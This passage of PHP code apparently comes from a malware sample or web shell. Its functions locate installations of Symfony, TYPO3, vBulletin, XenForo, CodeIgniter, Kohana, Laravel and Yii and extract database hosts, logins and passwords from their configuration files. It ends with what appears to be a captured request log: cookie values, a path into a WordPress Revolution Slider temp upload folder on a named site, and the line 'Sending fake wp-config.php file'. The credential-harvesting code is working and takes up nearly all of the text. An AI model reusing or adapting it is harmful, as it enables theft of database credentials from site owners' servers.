            if (strpos ($src, "env(DATABASE_URL)") !== false)
            {
                $dir = realpath ($filepath);

                $docroot = dirname( dirname (dirname ($dir)));

                return true;
            }
        }

    return false;
}

function get_symfony_info ($docroot)
{
    $src = @file_get_contents ("$docroot/app/config/parameters.yml");

    $src = str_replace (" ", "", $src);
    $src = str_replace ("\t", "", $src);

    $src = str_replace ("#env(DATABASE_URL)", "", $src);

    $src = getContents ($src, "env(DATABASE_URL):'mysql://", "'") ;

    $src = str_replace ("@", ":", $src);
    $src = str_replace ("/", ":", $src);

    $db_parameters = explode (":", $src);

    return array (

        'name' => 'symfony',
        'ver' => '',
        'docroot' => $docroot,

        'db_host' => $db_parameters [2],
        'db_login' => $db_parameters [0],
        'db_passwd' => $db_parameters [1],
        'db_name' => $db_parameters [4],

        'db_prefix' => ''

    );
}

/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */

function is_typo3 ($filepath, &$docroot)
{
    if (strpos ($filepath, "typo3conf") !== false)
    {
        if (strpos ($filepath, "LocalConfiguration.php") !== false)
        {
            $dir = realpath ($filepath);

            $docroot = dirname (dirname ($dir));

            return true;
        }
    }

    return false;
}

function get_typo3_info ($docroot)
{
    $src = @file_get_contents ("$docroot/typo3conf/LocalConfiguration.php");

    if (strpos ($src, "'Connections' => [") !== false)
    {
        return array (

            'name' => 'typo3',
            'ver' => '',
            'docroot' => $docroot,

            'db_host' => getContents ($src, "'host' => '", "'"),
            'db_login' => getContents ($src, "'user' => '", "'"),
            'db_passwd' => getContents ($src, "'password' => '", "'"),
            'db_name' => getContents ($src, "'dbname' => '", "'"),
            'db_prefix' => ''

        );
    }
    else
    {
        return array (

            'name' => 'typo3',
            'ver' => '',
            'docroot' => $docroot,

            'db_host' => getContents ($src, "'host' => '", "'"),
            'db_login' => getContents ($src, "'username' => '", "'"),
            'db_passwd' => getContents ($src, "'password' => '", "'"),
            'db_name' => getContents ($src, "'database' => '", "'"),
            'db_prefix' => ''

        );
    }
}

/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */

function is_vbulletin ($filepath, &$docroot)
{
    if (strpos (strtolower ($filepath), "version_vbulletin.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (preg_match ("/FILE_VERSION_VBULLETIN/", $src))
        {
            $dir = realpath ($filepath);

            while (dirname ($dir) != $dir)
            {
                $dir = dirname ($dir);

                if (file_exists ("$dir/config.php"))
                {
                    if (strpos ($dir, "includes") === false)
                    {
                        $docroot = $dir;

                        return true;
                    }
                }
            }
        }
    }

    return false;
}

function get_vbulletin_info ($docroot)
{
    $filenames = array (
        "$docroot/core/includes/config.php",
        "$docroot/includes/config.php" // 4.x
    );

    foreach ($filenames as $config)
    {
        if (file_exists ($config))
        {
            $text = @file_get_contents ($config);

            return array (
                'name' => 'vBulletin',
                'ver' => '',
                'docroot' => $docroot,

                'db_login' => getContents ($text, "config['MasterServer']['username'] = '", "'"),
                'db_passwd' => getContents ($text, "config['MasterServer']['password'] = '", "'"),

                'db_name' => getContents ($text, "config['Database']['dbname'] = '", "'"),
                'db_host' => getContents ($text, "config['MasterServer']['servername'] = '", "'"),
                'db_prefix' => getContents ($text, "config['Database']['tableprefix'] = '", "'")
            );
        }
    }
    return array();
}


/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */

function is_xenforo ($filepath, &$docroot)
{
    if (strpos (strtolower ($filepath), "index.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (strpos ($src, "XenForo") !== false)
        {
            $dir = realpath ($filepath);

            $docroot = dirname ($dir);

            return true;
        }
    }

    return false;
}

function get_xenforo_info ($docroot)
{
    $src = @file_get_contents ("$docroot/library/config.php");

    return array (

        'name' => 'xenforo',
        'ver' => '',
        'docroot' => $docroot,

        'db_host' => getContents ($src, "\$config['db']['host'] = '", "'"),
        'db_login' => getContents ($src, "\$config['db']['username'] = '", "'"),
        'db_passwd' => getContents ($src, "\$config['db']['password'] = '", "'"),
        'db_name' => getContents ($src, "\$config['db']['dbname'] = '", "'"),
        'db_prefix' => '',

    );
}


/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */

function is_codeigniter ($filepath, &$docroot)
{
    if (strpos ($filepath, "CodeIgniter.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (strpos ($src, "CI_VERSION") !== false)
        {
            $dir = realpath ($filepath);

            $docroot = dirname (dirname (dirname ($dir)));

            return true;
        }
    }

    return false;

}

function get_codeigniter_info ($docroot)
{
    $src = @file_get_contents ("$docroot/application/config/database.php");

    $active_group = getContents ($src, "active_group = '", "'");

    $settings = getContents ($src, "\$db['$active_group'] = array(", ")");
    
    $version = @file_get_contents ("$docroot/system/core/CodeIgniter.php");
    $ver = getContents ($version, "CI_VERSION = '", "'");
    
    if (empty ($ver))
    {
        $ver = getContents ($version, "'CI_VERSION', '", "'");
    }
    
    $src = str_replace (" ", "", $src);
    $src = str_replace ("\t", "", $src);
    
    if (!empty ($settings))
    {
        return array (
            'name' => 'codeigniter',
            'ver' => $ver,
            'docroot' => $docroot,

            'db_host' => getContents ($settings, "'hostname' => '", "'"),
            'db_name' => getContents ($settings, "'database' => '", "'"),
            'db_login' => getContents ($settings, "'username' => '", "'"),
            'db_passwd' => getContents ($settings, "'password' => '", "'"),
            'db_prefix' =>  getContents ($settings, "'dbprefix' => '", "'"),
        );
    }
    else
    {
        $active_group = getContents ($src, "\$active_group='", "'");

        return array (
            'name' => 'codeigniter',
            'ver' => $ver,
            'docroot' => $docroot,

            'db_host' => getContents ($src, "\$db['$active_group']['hostname']='", "'"),
            'db_name' => getContents ($src, "\$db['$active_group']['database']='", "'"),
            'db_login' => getContents ($src, "\$db['$active_group']['username']='", "'"),
            'db_passwd' => getContents ($src, "\$db['$active_group']['password']='", "'"),
            'db_prefix' =>  getContents ($src, "\$db['$active_group']['dbprefix']='", "'"),
        );
    }
}

/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */

function is_kohana ($filepath, &$docroot)
{
    if (strpos ($filepath, "index.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (strpos ($src, "KOHANA_START") !== false)
        {
            $dir = realpath ($filepath);

            $docroot = dirname ($dir);

            return true;
        }
    }

    if (strpos ($filepath, "bootstrap.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (strpos ($src, "classes/kohana") !== false)
        {
            $dir = realpath ($filepath);

            $docroot = dirname (dirname ($dir));

            return true;
        }
    }

    return false;

}

function get_kohana_info ($docroot)
{
    $src = @file_get_contents ("$docroot/application/config/database.php");

    $settings = getContents ($src, "'default' => array", "'charset'") ;

    $settings = str_replace (" ", "", $settings);
    $settings = str_replace ("\t", "", $settings);

    return array (

        'name' => 'kohana',
        'ver' => '',
        'docroot' => $docroot,

        'db_host' => getContents ($settings, "'hostname'=>'", "'"),
        'db_name' => getContents ($settings, "'database'=>'", "'"),
        'db_login' => getContents ($settings, "'username'=>'", "'"),
        'db_passwd' => getContents ($settings, "'password'=>'", "'"),
        'db_prefix' =>  getContents ($settings, "'table_prefix'=>'", "'"),

    );
}

/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */

function is_laravel ($filepath, &$docroot)
{
    if (strpos ($filepath, "autoload.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if (strpos ($src, "LARAVEL") !== false)
        {
            $dir = realpath ($filepath);

            $docroot = dirname (dirname ($dir));

            return true;
        }
    }

    return false;

}

function get_laravel_info ($docroot)
{
    $src = '';

    if (file_exists ("$docroot/config/database.php"))
        $src = @file_get_contents ("$docroot/config/database.php");
    else
        $src = @file_get_contents ("$docroot/app/config/database.php");

    $connection = getContents ($src, "'default' => '", "'");

    if (empty ($connection))
        $connection = getContents ($src, "'default' => env('DB_CONNECTION', '", "'");

    $settings = getContents ($src, "$connection' => [", "]");

    if (empty ($settings))
        $settings = getContents ($src, "$connection' => array(", ")");

    $host = getContents ($settings, "env('DB_HOST', '", "'");
    $name = getContents ($settings, "env('DB_DATABASE', '", "'");
    $login = getContents ($settings, "env('DB_USERNAME', '", "'");
    $pass = getContents ($settings, "env('DB_PASSWORD', '", "'");
    $prefix = getContents ($settings, "env('DB_TABLE_PREFIX', '", "'");

    $settings = str_replace (" ", "", $settings);
    $settings = str_replace ("\t", "", $settings);

    if (empty ($host))
        $host = getContents ($settings, "'host'=>'", "'");

    if (empty ($name))
        $name = getContents ($settings, "'database'=>'", "'");

    if (empty ($login))
        $login = getContents ($settings, "'username'=>'", "'");

    if (empty ($pass))
        $pass = getContents ($settings, "'password'=>'", "'");

    if (empty ($prefix))
        $prefix = getContents ($settings, "'prefix'=>'", "'");


    return array (

        'name' => 'laravel',
        'ver' => '',
        'docroot' => $docroot,

        'db_host' => $host,
        'db_name' => $name,
        'db_login' => $login,
        'db_passwd' => $pass,
        'db_prefix' => $prefix

    );
}

/*
 *
 *
 *
 * 
 *
 * 
 *
 *
 */

function is_yii ($filepath, &$docroot)
{
    if (strpos ($filepath, "index.php") !== false)
    {
        $src = @file_get_contents ($filepath);

        if ((strpos ($src, "Yii::createWebApplication") !== false) ||
            (strpos ($src, "\\yii\\web\\Application") !== false) ||
            (strpos ($src, "/yii/web/Application") !== false))
        {
            $dir = realpath ($filepath);

            if (strpos ($src, "../common") !== false)
                $docroot = dirname (dirname ($dir));
            else
                $docroot = dirname ($dir);

            return true;
        }
    }

    return false;

}

function get_yii_info ($docroot)
{

    $src = @file_get_contents ("$docroot/protected/config/main.php");
    $src .= @file_get_contents ("$docroot/backend/config/main.php");
    $src .= @file_get_contents ("$docroot/common/config/main.php");

    $src .= @file_get_contents ("$docroot/config/db.php");
    $src .= @file_get_contents ("$docroot/config/default.php");

    //$src .= file_get_contents ("$docroot/backend/config/main-local.php");
    //$src .= file_get_contents ("$docroot/common/config/main-local.php");

    $src = str_replace (" ", "", $src);
    $src = str_replace ("\t", "", $src);

    $settings = getContents ($src, "'=>'mysql:", "),");

    if (empty ($settings))
    {
        $settings = getContents ($src, "'=>'mysql:", "],");
    }

    return array (

        'name' => 'yii',
        'ver' => '',
        'docroot' => $docroot,

        'db_host' => getContents ($settings, "host=", ";"),
        'db_name' => getContents ($settings, "dbname=", "',"),
        'db_login' => getContents ($settings, "'username'=>'", "'"),
        'db_passwd' => getContents ($settings, "'password'=>'", "'"),
        'db_prefix' =>  getContents ($settings, "'tablePrefix'=>'", "'"),
    );
}


)

_COOKIE
 Array
(
    [227e948fdbaaeccbbb7b3f42fbe848e8] => 227e948fdbaaeccbbb7b3f42fbe848e8
    [d8670190bc460b6abebf276d20db5892] => 866fd58d77526c1bda8771b5b21d5b11
)

_FILES
 
END _FILES
 $my_blog=http://stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider
Sending fake wp-config.php file
